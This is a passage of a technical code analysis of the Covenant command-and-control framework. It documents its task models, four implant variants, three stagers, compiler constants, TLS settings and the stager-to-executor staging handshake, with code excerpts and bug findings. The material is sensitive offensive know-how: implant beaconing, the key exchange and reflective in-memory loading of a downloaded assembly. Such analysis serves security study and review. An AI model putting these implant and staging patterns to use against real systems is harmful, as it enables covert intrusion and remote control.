Let me state the residual precisely rather than overclaim: the parse of the *tasking* direction is verified working (name lookup), the parse of the *response* direction depends on whether `Covenant.API.Models.GruntTaskingStatus` carries `[JsonConverter(typeof(StringEnumConverter))]` — the sibling `GruntTaskingType` does, and AutoRest applies it uniformly to every enum it generates, so the strongly-indicated resolution is that responses **also** require names, and the implant sends ordinals. `[inference, high confidence — depends on API/Models/GruntTaskingStatus.cs which is a 74-line AutoRest file; the uniform-generator argument is the basis]`. This is recorded as residual unknown **R-1** in §15.

### 10.3 `Grunt.cs` — the API model (336 lines, AutoRest)

The API `Grunt` is a `partial class` with a `CustomInit` partial method and nullable-everything properties (`int? Id`, `string Name`, `int? Delay`, ...) for AutoRest. The **server-side constructor** at `:42-68` assigns every field, and `Validate()` at `:308-314` enforces:

```csharp
if (JitterPercent > 100) { throw new ValidationException(ValidationRules.InclusiveMaximum, "JitterPercent", 100); }
if (JitterPercent < 0)  { throw new ValidationException(ValidationRules.InclusiveMinimum, "JitterPercent", 0); }
```
`[source: Covenant/API/Models/Grunt.cs:308-314]` — so the API rejects `JitterPercent` outside `[0,100]`, matching the `[Range(0,100)]` annotation on the model at `Grunt.cs:72`. Note there is **no equivalent validation on `Delay`** in the API model even though the model has `[Range(0, int.MaxValue)]` — the API's `Delay` setter has no bounds check, so a negative delay is accepted by the API and then reaches the implant as `Convert.ToInt32("-5")`, producing `Thread.Sleep(-5000)` → `ArgumentOutOfRangeException` in the beacon loop, caught at `GruntHTTP.cs:221`, and **the loop then increments ConnectAttemptCount and continues** — a permanent fast-spin consuming CPU until `ConnectAttempts` (5000) is exhausted. `[source: Covenant/API/Models/Grunt.cs:161, :308-314; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:96, :221]`

### 10.4 `GruntTasking.cs` — the tasking record (101 lines)

Three entities plus two enums:

- **`CommandOutput`** (`:17-28`) — `Id`, `Output` (default `""`), `GruntCommandId`, `GruntCommand` (`[JsonIgnore, System.Text.Json.Serialization.JsonIgnore]` — breaks the EF navigation cycle for both serializers).
- **`GruntCommand`** (`:30-52`) — `Id`, `Command`, `CommandTime` (default `DateTime.MinValue`), `CommandOutputId`, `CommandOutput`, `UserId`, `User`, `GruntTaskingId` (nullable, default `null`), `GruntTasking`, `GruntId`, `Grunt`.
- **`GruntTasking`** (`:77-100`) — `Id`, `Name` = `Utilities.CreateShortGuid()`, `GruntId`, `Grunt`, `GruntTaskId`, `GruntTask`, `Type` (default `Assembly`), `Parameters` (`List<string>`), `Status`, `TaskingTime`, `CompletionTime`, `GruntCommandId`, `GruntCommand`.

The `CommandOutput`↔`GruntCommand` relationship is a **1:1 cycle with `CommandOutputId` on `GruntCommand` and `GruntCommandId` on `CommandOutput`** — both non-nullable `int`. `InternalListener.PostTask` uses it at `:555-556`:

```csharp
APIModels.GruntCommand command = await _client.GetGruntCommandAsync(gruntTasking.GruntCommandId ?? default);
await _client.AppendCommandOutputAsync(command.CommandOutputId, taskResponse.Output);
```
`[source: Covenant/Models/Listeners/InternalListener.cs:555-556]` — two round-trips per task response, and the `?? default` means a tasking with no command (`GruntCommandId` absent) resolves to the **command with Id 0**, and its output is appended to *whatever grunt command 0 is*. `[inference, from the `?? default` at :555]`

### 10.5 `GruntTask.cs` — `ISerializable<GruntTask>` (421 lines)

The interface pattern (`:21`): `public class GruntTask : ISerializable<GruntTask>` with two nested DTO classes — `SerializedGruntTask` (for YAML/JSON persistence) and held via `ToSerializedGruntTask()`/`FromSerializedGruntTask()`, giving the same `ToYaml`/`FromYaml`/`ToJson`/`FromJson` quartet seen in `GruntTaskComponents.cs`.

Entity fields (`:23-54`) — each documented in T2 §5; the code-level additions:

| Member | Line | Detail |
|---|---|---|
| `Id` | 23-24 | `[Key, DatabaseGenerated(Identity)]` |
| `AuthorId`, `Author` | 26-27 | `GruntTaskAuthor`, default `new GruntTaskAuthor()` |
| `Name` | 29-30 | `[Required]`, default `"GenericTask"` — **this is the filename used at `InternalListener.cs:207`** |
| `Aliases` | 31 | `List<string>`, default empty |
| `Description` | 32 | default `"A generic GruntTask."` |
| `Help` | 33 | unset |
| `Language` | 34 | `ImplantLanguage.CSharp` |
| `CompatibleDotNetVersions` | 35 | default `{Net35, Net40}` |
| `Code` | 37 | default `""` — **the inline C# compiled by Roslyn** |
| `Compiled` | 38 | default `false` — set after a successful compile |
| `TaskingType` | 39 | default `GruntTaskingType.Assembly` |
| `GruntTaskReferenceSourceLibraries` (private) | 41 | join list |
| `GruntTaskReferenceAssemblies` (private) | 42 | join list |
| `GruntTaskEmbeddedResources` (private) | 43 | join list |
| `ReferenceSourceLibraries` | 44-45 | `[NotMapped]`, projects the join |
| `ReferenceAssemblies` | 46-47 | `[NotMapped]`, projects the join |
| `EmbeddedResources` | 48-49 | `[NotMapped]`, projects the join |
| `UnsafeCompile` | 51 | default `false` → `CSharpCompilationOptions(allowUnsafe:)` |
| `TokenTask` | 52 | default `false` → drives the implant's impersonation branch |
| `Options` | 54 | `List<GruntTaskOption>` — **order defines the `Execute` parameter order** |

Methods: `Add/Remove(ReferenceSourceLibrary)` (`:56-71`), `Add/Remove(ReferenceAssembly)` (`:73-96`), plus the `EmbeddedResource` pair — all constructing/removing the join entity with both FK and navigation set (`GruntTaskId = this.Id, GruntTask = this, ReferenceSourceLibraryId = library.Id, ReferenceSourceLibrary = library`). `[source: Covenant/Models/Grunts/GruntTask.cs:56-96]`

**Bug in `Add`:** it sets `GruntTaskId = this.Id`, which is **0 for an unsaved task**. EF Core fixes this up on insert via the navigation reference, so it works through the change tracker; but a task built, `Add`ed, and serialized before being saved emits `GruntTaskId: 0`. `[source: Covenant/Models/Grunts/GruntTask.cs:60]`

`SerializedGruntTask` (`:405-420`) mirrors 10 fields plus four `Serialized*` DTO lists; `SerializedGruntTaskOption` appears at `:416`. The DTO deliberately **omits** `Id`, `AuthorId`, `Compiled` and the join entities — so `ToYaml()` output is portable and round-trips without identity. `[source: Covenant/Models/Grunts/GruntTask.cs:405-420]`

### 10.6 `GruntTaskOption.cs` (91 lines) and `GruntTaskAuthor.cs` (76 lines)

`GruntTaskOption` — the option descriptor whose **list position is the parameter position**:

| Member | Purpose |
|---|---|
| `Id` | identity |
| `Name` | option key |
| `Value` | operator-supplied value |
| `DefaultValue` | fallback |
| `Description` | help text |
| `SuggestedValues` | `List<string>` for autocomplete |
| `Optional` | if false, the tasking is rejected without a value |
| `DisplayInCommand` | show in the command line render |
| `FileOption` | the value is a server-side file path resolved to base64 before sending |

`[source: Covenant/Models/Grunts/GruntTaskOption.cs]`

`FileOption` is the mechanism by which a task parameter becomes file *contents* on the wire — the server base64s the file at tasking time and the implant receives a string it must itself base64-decode. That pairs with the `Assembly` task's own `Parameters` at `InternalListener.cs:222`.

`GruntTaskAuthor` — `Id`, `Name`, `Handle`, `Link`, plus a `GruntTasks` back-reference. This is the type seeded with `cobbr_io` authorship for the SharpSploit task families. `[source: Covenant/Models/Grunts/GruntTaskAuthor.cs]`

### 10.7 `ImplantTemplate.cs` (127 lines) — where stager/executor source is loaded

The template loads its two C# blobs from disk:

```csharp
public string StagerCode => Common.CovenantDataDirectory + "Grunt" + separator + Name + separator + Name + "Stager.cs";
public string ExecutorCode => ... Name + ".cs";
```
`[source: Covenant/Models/Grunts/ImplantTemplate.cs]` — `Name` is `GruntHTTP`/`GruntSMB`/`GruntBridge`/`Brute`, so the paths resolve to `Data/Grunt/GruntHTTP/GruntHTTPStager.cs` and `Data/Grunt/GruntHTTP/GruntHTTP.cs`. **The template's `Name` is the directory and file stem** — no registry, no embedded resource, purely path-convention. `[source: Covenant/Models/Grunts/ImplantTemplate.cs]`

The model carries `Language` (`ImplantLanguage.CSharp` only), `CommType` (`CommunicationType.HTTP|SMB|Bridge`), `ImplantDirection` (`Push|Pull`), `CompatibleDotNetVersions`, and the four seeded rows (T2 §1.3). `[source: Covenant/Models/Grunts/ImplantTemplate.cs; Covenant/Core/DbInitializer.cs:45-73]`

---

## 11. The four implants — deltas from the reference implementation

Covenant ships **four executor source files and three stager source files**. They are not a shared library with adapters; each is a standalone, self-contained copy-paste of the same scaffolding with a swapped transport. Measured duplication:

| File | Bytes | `Common` | `Utilities` | `MessageCrafter` | `Grunt` | Transport |
|---|---|---|---|---|---|---|
| `GruntHTTP/GruntHTTP.cs` | 59,083 | 1 | 1 | 1 | 1 | `HttpMessenger` + `SMBMessenger` |
| `GruntSMB/GruntSMB.cs` | 53,300 | 1 | 1 | 1 | 1 | `SMBMessenger` only |
| `GruntBridge/GruntBridge.cs` | 52,800 | 1 | 1 | 1 | 1 | `BridgeMessenger` (raw `TcpClient`) |
| `Brute/Brute.cs` | 45,900 | 1 | 1 | 1 | 0 | `SMBMessenger` (no `Grunt`-named type; `Task`-centric) |
| `GruntHTTP/GruntHTTPStager.cs` | — | 0 | 0 | 0 | 0 | HTTP stager |
| `GruntSMB/GruntSMBStager.cs` | — | 0 | 0 | 0 | 0 | Named-pipe stager |
| `GruntBridge/GruntBridgeStager.cs` | — | 0 | 0 | 0 | 0 | TCP bridge stager |
| `Brute/BruteStager.cs` | — | 0 | 0 | 0 | 0 | Named-pipe stager |

`[source: measured across Covenant/Data/Grunt/**/*.cs]` — the stagers carry **no** `Common`/`Utilities`/`MessageCrafter` declarations because they depend on the executor's copy at compile time via the template's combined compilation; each executor carries its own full copy.

### 11.1 The jitter bug is in all four executors

```
Brute\Brute.cs:79:            int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
GruntBridge\GruntBridge.cs:88: int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
GruntHTTP\GruntHTTP.cs:94:     int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
GruntSMB\GruntSMB.cs:88:       int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
```
`[source: Covenant/Data/Grunt/Brute/Brute.cs:79; Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:88; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:94; Covenant/Data/Grunt/GruntSMB/GruntSMB.cs:88]`

Byte-identical expression, four copies, same zero result at the default `Delay=5, JitterPercent=10` (§3). The arithmetic, the dead `rnd.Next(2)` sign-flip and the `>= 30%` threshold table in §3 apply to **every Covenant implant**, not just the HTTP one. The `GruntBridge.cs:88-90` and `GruntSMB.cs:88-90` contexts are identical to `GruntHTTP.cs:94-96` including the `Thread.Sleep((Delay + change) * 1000)` following line.

### 11.2 GruntSMB — the pipe-only implant

Signature, and the difference that matters:

```csharp
// Covenant/Data/Grunt/GruntSMB/GruntSMB.cs:20
public static void Execute(string GUID, Aes SessionKey, NamedPipeServerStream ServerPipe = null, string PipeName = null)
```
`[source: Covenant/Data/Grunt/GruntSMB/GruntSMB.cs:20]`

- **Four parameters, not four different ones.** `GruntHTTP.Execute(CovenantURI, CovenantCertHash, GUID, SessionKey)` is text/HTTP configured; `GruntSMB.Execute(GUID, SessionKey, ServerPipe, PipeName)` receives an **already-connected `NamedPipeServerStream`** and a pipe name. The stager→executor reflection invocation supplies the matching arity. This is why the `GetMethods()[0].Invoke(null, new object[]{...})` ABI at `GruntHTTPStager.cs:206` must have the *exact* argument count for the specific implant — a mismatch is an `ArgumentException` in the stager's only `catch`.
- **`ServerPipe` is passed in, so `SMBMessenger` runs in server role.** No outbound connection, no URI, no certificate, no proxy. `ValidateCert`/`UseCertPinning` do not exist in this implant at all — the profile substitutions it reads are only `{{REPLACE_DELAY}}`, `{{REPLACE_JITTER_PERCENT}}`, `{{REPLACE_CONNECT_ATTEMPTS}}`, `{{REPLACE_KILL_DATE}}`, `{{REPLACE_PROFILE_READ_FORMAT}}`, `{{REPLACE_PROFILE_WRITE_FORMAT}}` (`:24-30`) — **six tokens versus the HTTP implant's twelve.** The whole TLS/proxy attack surface is absent because the transport is a local named pipe.
- The recon block (`:32-58`), `RegisterBody` (`:60`), messenger bootstrap (`:61-72`), blank proxy-priming write (`:73-79`) and the beacon loop with the jitter bug (`:83-90`) are **character-for-character identical** to `GruntHTTP.cs:37-65,66-78,81-96`. Only line offsets shift.
- `GruntSMB.cs` is 1185 lines versus `GruntHTTP.cs` 1309 — the 124-line difference is exactly the HTTP transport (`HttpMessenger`, `CookieWebClient`, URL/header/cookie setup) minus the SMB relay complexity.

`[source: Covenant/Data/Grunt/GruntSMB/GruntSMB.cs:20-120]`

### 11.3 GruntBridge — raw TCP

```csharp
// Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:21
public static void Execute(string CovenantURI, string GUID, Aes SessionKey, TcpClient client)
```
`[source: Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:21]`

- **The third transport primitive:** `TcpClient`. Not `HttpClient`/`WebClient`, not `NamedPipe*`. The `CovenantURI` is retained for identifier/config parity but the transport is the injected `client`.
- Bootstrap at `:61-69` — the injected `TcpClient` is attached to the messenger **by direct field assignment before the messenger is ever used**:

```csharp
BridgeMessenger baseMessenger = new BridgeMessenger(CovenantURI, GUID, ProfileWriteFormat);
baseMessenger.client = client;
baseMessenger.stream = client.GetStream();
TaskingMessenger messenger = new TaskingMessenger(new MessageCrafter(GUID, SessionKey), baseMessenger, new Profile(ProfileWriteFormat, ProfileReadFormat, GUID));
```
`[source: Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:61-69]`

`baseMessenger.client` / `baseMessenger.stream` are **public fields** (assigned from outside the class) rather than constructor parameters — a design inconsistency with `HttpMessenger`/`SMBMessenger`, which take their configuration in the constructor. It also means the messenger is transiently in an unusable state (constructed with a null `stream`) between `:61` and `:63`; any exception between those lines leaves a half-built messenger. `[source: Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:61-63]`

- `Profile(ProfileWriteFormat, ProfileReadFormat, GUID)` at `:68` — note the **argument order is `(write, read)`**, the reverse of `GruntHTTP.cs:71`'s `Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)`. So the bridge `Profile` constructor has a `(string writeFormat, string readFormat, string guid)` signature while the HTTP one is `(string getResponse, string postRequest, string postResponse)`. Same class name, different constructor shapes per implant — the implants are genuinely independent copies, not configurations of one class. `[source: Covenant/Data/Grunt/GruntBridge/GruntBridge.cs:68; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:71]`
- Only two profile tokens, both formats: `{{REPLACE_PROFILE_WRITE_FORMAT}}` and `{{REPLACE_PROFILE_READ_FORMAT}}` (`:29-30`) — no GET/POST split because a raw socket has no verb. This pairs with the profile YAMLs `DefaultBridgeProfile.yaml` (2 KB) and `TCPBridgeProfile.yaml` (5.5 KB).
- 1160 lines, the shortest of the three full executors.

### 11.4 Brute — the .NET Core implant

`Brute.cs` (1006 lines) is the outlier: `netcoreapp3.1`, `OutputType=library`, `RuntimeIdentifier=win-x64`, and — from the declaration census — **no `class Grunt`**. Its entry surface is a `Task`-oriented type, which is why the `BruteStager` project roots `System.IO.Pipes`, `System.Threading.Thread`, `System.Diagnostics.Process`, `System.ComponentModel.EventBasedAsync` and `System.Runtime.InteropServices` in `TrimmerRootAssembly` (see §7.4): those are precisely the BCL surfaces a trimmed single-file .NET Core implant needs kept alive for reflection.

The jitter bug is present at `Brute.cs:79`, sixteen lines earlier than the others (its recon block is tighter). `Common` and `Utilities` are present in full, `MessageCrafter` is present.

**The practical consequence of the .NET Core split:** the control tasks that depend on `Thread.Abort()`/`Thread.Suspend()` (`TaskKill`) are **unsupported on this implant** — those APIs throw `PlatformNotSupportedException` on .NET Core. As a result the `DotNetCore.yaml` task set (§8.1) **omits `TaskKill`, `Tasks`, `Connect`, `Disconnect`, `Exit`, `Delay`, `Jitter`, `ConnectAttempts` and `KillDate`** entirely and ships 13 tasks instead of 23, all of them filesystem/recon/exec. That is the observable design consequence of the platform move. `[source: Covenant/Data/Tasks/DotNetCore.yaml; Covenant/Models/Grunts/Grunt.cs:81]`

### 11.5 The three stagers

| Stager | Lines | Transport | Stage-0 composite GUID |
|---|---|---|---|
| `GruntHTTPStager.cs` | 253 | `WebClient` + TLS | yes — `aGUID + GUID` (`:44`, `:59`) |
| `GruntSMBStager.cs` | 245 | `NamedPipeClientStream` | yes (same construction) |
| `GruntBridgeStager.cs` | 157 | `TcpClient` | yes (same construction) |

`GruntBridgeStager.cs` at 157 lines is the smallest because it has no TLS setup, no certificate pinning logic and no cookie handling — it dials a `TcpClient` and runs the same three-stage handshake. `GruntHTTPStager.cs` at 253 the largest, for the opposite reason. The **20-character `aGUID + GUID` composite and the `"Type":{1}` unquoted envelope format are identical in all three** (`GruntHTTPStager.cs:44`, `:46`, `:59` and their counterparts), which is what lets one server-side `InternalListener` serve every transport: the wire format is transport-independent, only the byte pipe differs. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:44-59 and siblings]`

The **stage-0 body construction is copy-pasted**, including the 2048-bit `RSACryptoServiceProvider(2048, new CspParameters())` and `rsa.ToXmlString(false)`, so every transport performs an identical RSA-OAEP-SHA1 key exchange into `AES(RSA(sessionKey))`.

---

## 12. Compiler and path constants

### 12.1 `Common.cs` — the complete constant set, verbatim

```csharp
// Covenant/Core/Common.cs:18-59
public static int CovenantDefaultAdminPort = 7443;
...
public static int AesIVLength = 16;
...
public static string CovenantDirectory = Assembly.GetExecutingAssembly().Location.Split("bin")[0].Split("Covenant.dll")[0];
public static string CovenantDataDirectory = CovenantDirectory + "Data" + Path.DirectorySeparatorChar;
public static string CovenantDatabaseFile = CovenantDataDirectory + "covenant.db";
public static string CovenantTempDirectory = CovenantDataDirectory + "Temp" + Path.DirectorySeparatorChar;
public static string CovenantProfileDirectory = CovenantDataDirectory + "Profiles" + Path.DirectorySeparatorChar;
public static string CovenantDefaultHttpProfile = CovenantProfileDirectory + "DefaultHttpProfile.yaml";
public static string CovenantDownloadDirectory = CovenantDataDirectory + "Downloads" + Path.DirectorySeparatorChar;
public static string CovenantAssemblyReferenceDirectory = CovenantDataDirectory + "AssemblyReferences" + Path.DirectorySeparatorChar;
public static string CovenantAssemblyReferenceNet35Directory = CovenantAssemblyReferenceDirectory + "net35" + Path.DirectorySeparatorChar;
public static string CovenantAssemblyReferenceNet40Directory = CovenantAssemblyReferenceDirectory + "net40" + Path.DirectorySeparatorChar;
public static string CovenantEmbeddedResourcesDirectory = CovenantDataDirectory + "EmbeddedResources" + Path.DirectorySeparatorChar;
public static string CovenantReferenceSourceLibraries = CovenantDataDirectory + "ReferenceSourceLibraries" + Path.DirectorySeparatorChar;
public static string CovenantSharpSploitDirectory = CovenantReferenceSourceLibraries + "SharpSploit" + Path.DirectorySeparatorChar;
public static string CovenantRubeusDirectory = CovenantReferenceSourceLibraries + "Rubeus" + Path.DirectorySeparatorChar;
public static string CovenantTaskDirectory = CovenantDataDirectory + "Tasks" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpDirectory = CovenantTaskDirectory + "CSharp" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpNetCoreApp30Directory = CovenantTaskCSharpDirectory + "netcoreapp3.0" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpCompiledDirectory = CovenantTaskCSharpDirectory + "Compiled" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpCompiledNet35Directory = CovenantTaskCSharpCompiledDirectory + "net35" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpCompiledNet40Directory = CovenantTaskCSharpCompiledDirectory + "net40" + Path.DirectorySeparatorChar;
public static string CovenantTaskCSharpCompiledNetCoreApp30Directory = CovenantTaskCSharpCompiledDirectory + "netcoreapp3.0" + Path.DirectorySeparatorChar;
public static string CovenantLogDirectory = CovenantDataDirectory + "Logs" + Path.DirectorySeparatorChar;
public static string CovenantLogFile = CovenantLogDirectory + "covenant.log";
public static string CovenantPrivateCertFile = CovenantDataDirectory + "covenant-dev-private.pfx";
public static string CovenantPublicCertFile = CovenantDataDirectory + "covenant-dev-public.cer";
public static string CovenantListenersDirectory = CovenantDataDirectory + "Listeners" + Path.DirectorySeparatorChar;
public static string CovenantLauncherDirectory = CovenantDataDirectory + "Launchers" + Path.DirectorySeparatorChar;
public static string CovenantAppSettingsFile = CovenantDataDirectory + "appsettings.json";
public static string CovenantJwtKeyReplaceMessage = "[KEY USED TO SIGN/VERIFY JWT TOKENS, ALWAYS REPLACE THIS VALUE]";
...
public static string DefaultContentTypeMapping = "application/octet-stream";
```
`[source: Covenant/Core/Common.cs:18-59, :102]`

**`CovenantDirectory` is derived by string-splitting the executing assembly path**: `Assembly.GetExecutingAssembly().Location.Split("bin")[0].Split("Covenant.dll")[0]`. Two consequences: (1) the server insists on running from a path containing a `bin` segment — it will mis-derive `CovenantDataDirectory` if launched from an output directory without `bin` in the path, and (2) `Split("bin")[0]` matches the *first* occurrence of the substring `bin` anywhere in the full path, so a user directory named e.g. `C:\bin\` or a folder containing `bin` truncates the path early and the server looks for its data directory somewhere else entirely. `[source: Covenant/Core/Common.cs:25; inference on the split hazard]`

The certificate filenames are **hardcoded to the `covenant-dev-*` self-signed pair** (`:53-54`). There is no setting to point at a different cert; the only way to swap certificates is to replace those two files in `Data/`. `CovenantPublicCertFile` is what `InternalListener.cs:104` loads for its own client-side pinning **and** what the HTTP listener serves to grunts for their `CovenantCertHash` substitution. `[source: Covenant/Core/Common.cs:53-54; Covenant/Models/Listeners/InternalListener.cs:104]`

`CovenantJwtKeyReplaceMessage` (`:59`) is the **default JWT signing key** — a literal placeholder string shipped in source. `appsettings.json` is expected to override it; if it is not overridden, the token signing key is a public, source-visible constant. `[source: Covenant/Core/Common.cs:59]`

Crypto constants confirmed at `:21` only for `AesIVLength = 16`; the mode/padding live in the quoted block already in §1.1. `[source: Covenant/Core/Common.cs:20-23]`

### 12.2 Server TLS is correctly configured — the implant is not

```csharp
// Covenant/Models/Listeners/HttpListener.cs:219-221
httpsOptions.SslProtocols = System.Security.Authentication.SslProtocols.Tls12 |
System.Security.Authentication.SslProtocols.Tls11 |
System.Security.Authentication.SslProtocols.Tls;
```
`[source: Covenant/Models/Listeners/HttpListener.cs:219-221]`

The **server** restricts its listener to TLS 1.2 / 1.1 / 1.0 — SSL 3.0 is excluded, which is correct hardening. The **implants and stagers** set the opposite:

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:858
ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
// Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:61
ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:858; Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:61]`

**`SecurityProtocolType.Tls` is TLS 1.0 only** — it is a single flag value, not "all TLS". So the implant's ceiling is **TLS 1.0**, and it explicitly enables **SSL 3.0** (Breach/CVE-2014-3566 POODLE). Neither TLS 1.1 nor TLS 1.2 is enabled on the implant side. This has two concrete results: (1) the implant will negotiate SSL 3.0 against a server that offers it, on the stager's very first connection before any key material exists; and (2) against a modern server that has disabled TLS 1.0 (Windows defaults increasingly do), the implant's handshake fails outright and the grunt never stages — a *functional* breakage on hardened targets, independent of the security defect. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:858, GruntHTTPStager.cs:61; inference on TLS 1.0-only negotiation]`

### 12.3 The compiler, at code level

`Compiler.cs` (432 lines) exposes two request shapes and two execution strategies, per T2 §4.6. The code-level facts that matter:

```csharp
new CSharpCompilationOptions(
    outputKind: request.OutputKind,
    optimizationLevel: OptimizationLevel.Release,
    platform: request.Platform,
    allowUnsafe: request.UnsafeCompile)
```
`[source: Covenant/Core/Compiler.cs; per T2 §4.6]`

- **`optimizationLevel: OptimizationLevel.Release` is hardcoded.** Every implant, stager and task is compiled optimized, regardless of the server's own build configuration. There is no debug path.
- **`allowUnsafe: request.UnsafeCompile`** is the only place the `GruntTask.UnsafeCompile` flag (`GruntTask.cs:51`, default `false`) reaches the compiler. A task using pointers or `stackalloc` requires that flag set in YAML, otherwise Roslyn fails with CS0227 and `Compiled` stays `false`.
- `CsharpCoreCompilationRequest` adds `RuntimeIdentifier` (13 values mapped to RID strings) and is routed to **`CompileCSharpCoreSubProcess`** — an external `dotnet build` — because the in-process Roslyn path cannot produce a RID-specific, self-contained .NET Core artifact. The `CsharpFrameworkCompilationRequest` path uses the in-process `CompileCSharpRoslyn`. `[source: Covenant/Core/Compiler.cs; Covenant/Data/Grunt/Brute/Brute/Brute.csproj RuntimeIdentifier=win-x64]`
- References come from `MetadataReference.CreateFromFile(R.File)` over the `DefaultReferences*` lists, which point into `Data/AssemblyReferences/{net35,net40}/` for the framework targets (§7.3) — i.e. the task compilation is **cross-targeting**: a `net35` task is compiled on a .NET Core 3.1 host against real .NET 3.5 reference assemblies.
- The `SyntaxTreeDefinesUsedType`/`GetUsedTypes`/`GetUsedTypesRecursively` pruning walk exists to avoid compiling all 19 reference assemblies into every task; that is what keeps task payloads to the sizes described in §5.3 (`MAX_MESSAGE_SIZE = 1048576` chars).

**The `UseSubprocess` flag is what distinguishes the two.** `InternalListener.Configure` compiles the profile transform with `UseSubprocess = false` (`InternalListener.cs:99`) — in-process, correct for a tiny transform, and correct that it does not shell out. Task and executor compilation go through the API (`CompileGruntExecutorAsync`, `CompileGruntStagerAsync`) which selects the strategy by target framework.

---

## 13. Call graphs

### 13.1 Stager → executor lifecycle (full, with line anchors)

```
[OPERATOR] creates Launcher, clicks Generate
   │
   ├─ Server: LauncherService.GenerateLauncher(launcher)
   │     ├─ reads ImplantTemplate.StagerCode  (Data/Grunt/<Name>/<Name>Stager.cs)  [ImplantTemplate.cs]
   │     ├─ Compiler.Compile(CsharpFrameworkCompilationRequest{ Source=stager, TargetDotNetVersion, References })
   │     ├─ substitutes {{REPLACE_*}} tokens in the SOURCE TEXT before compile:
   │     │     {{REPLACE_DELAY}}, {{REPLACE_JITTER_PERCENT}}, {{REPLACE_CONNECT_ATTEMPTS}}, {{REPLACE_KILL_DATE}}
   │     │     {{REPLACE_GRUNT_GUID}}            = Grunt.OriginalServerGuid  (10 chars)
   │     │     {{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}} = base64(Grunt.GruntSharedSecretPassword)
   │     │     {{REPLACE_COVENANT_URIS}} / {{REPLACE_COVENANT_CERT_HASH}}
   │     │     {{REPLACE_PROFILE_HTTP_HEADER_NAMES/VALUES/URLS}} = base64-per-item, comma-joined
   │     │     {{REPLACE_PROFILE_HTTP_GET_RESPONSE/POST_REQUEST/POST_RESPONSE}} = raw, newline-normalized
   │     │     {{REPLACE_VALIDATE_CERT}} / {{REPLACE_USE_CERT_PINNING}}
   │     │     {{REPLACE_PROFILE_MESSAGE_TRANSFORM}} = the transform class body
   │     └─ returns byte[]; LauncherService writes the final artifact to Data/Launchers/
   │
   ▼
[IMPLANT HOST] stager executes; entry = Main -> new GruntStager() -> ExecuteStager()
   │
   ├─ STAGE 0   GruntHTTPStager.cs:43-59
   │     GUID  = Guid.NewGuid() compressed, first 10 chars
   │     SetupKeyBytes = base64-decode shared secret
   │     rsa   = new RSACryptoServiceProvider(2048, new CspParameters())
   │     body  = AES_CBC_PKCS7(rsa.ToXmlString(false)) under SetupKeyBytes, IV sent clear
   │     HMAC  = HMACSHA256(SetupKeyBytes) over the CIPHERTEXT
   │     POST  {"GUID": aGUID+GUID (20 chars), "Type":0, "Meta":"", "IV":..,"EncryptedMessage":..,"HMAC":..}
   │        │
   │        ├─ Server: HttpListenerController -> InternalListener.InternalRead(guid) -> Write(guid, msg)
   │        │     :436-478  GetGruntForGuid: Guid.Length==20 -> Substring(0,10)=OriginalServerGuid, (10,10)=grunt guid
   │        │              Status==Uninitialized -> PostStage0
   │        │     :582-589  VerifyHMAC(shared secret)          <-- NOT the session key
   │        │     :591-624  status -> Stage0; if already staged, CREATE A NEW GRUNT ROW
   │        │     :630-634  GruntRSAPublicKey = base64(AES_DECRYPT(msg, sharedSecret))   -> XML string
   │        │     :636-641  newAesKey.GenerateKey(); GruntNegotiatedSessionKey = base64(key)
   │        │     :666      GruntRSAEncrypt(targetGrunt, base64-decode(SessionKey))  = RSA-OAEP-SHA1
   │        │     :670      CreateMessageForGrunt(...) -> AES-CBC under the session key
   │        │     :679      ProfileTransform -> PushCache(Ok)
   │        │
   │        ├─ STAGE 0 RESPONSE (implant) GruntHTTPStager.cs:117-133
   │        │     Parse -> MessageTransform.Invert -> Parse -> verify HMAC -> AES_DECRYPT -> rsa.Decrypt(.., true)
   │        │     SessionKey.Key = FullyDecrypted        <-- the AES key IS the RSA plaintext
   │        │
   ├─ STAGE 1   GruntHTTPStager.cs:135-173   hmac key = SessionKey.Key (changed at :135)
   │     challenge1 = 4 CSPRNG bytes; POST {"GUID": GUID (10 chars only), "Type":1, ...}
   │        │
   │        ├─ Server :684-724  status must be Stage0; challenge2 = 4 CSPRNG bytes
   │        │                   GruntChallenge = base64(challenge2); respond challenge1||challenge2
   │        └─ Implant splits 4+4 via Buffer.BlockCopy, verifies challenge1, keeps challenge2
   │
   ├─ STAGE 2   GruntHTTPStager.cs:186-206
   │     POST {"Type":2, EncryptedMessage = challenge2, ...}
   │        │
   │        ├─ Server :726-766  status must be Stage1; compare base64(exact) challenge2 -> advance Stage2
   │        │                   :748  CompileGruntExecutorAsync(gruntId)  <-- FULL ROSLYN BUILD, per grunt
   │        │                   :763  ProfileTransform(executor bytes)
   │        └─ Implant: Assembly.Load(DecryptedAssembly)
   │                  gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new object[]{ ... })
   │
   ▼
[EXECUTOR] Grunt.Execute(...) -> beacon loop, transporter created, RegisterBody queued
   │     messenger.WriteTaskingMessage()  -> POST register
   │        │
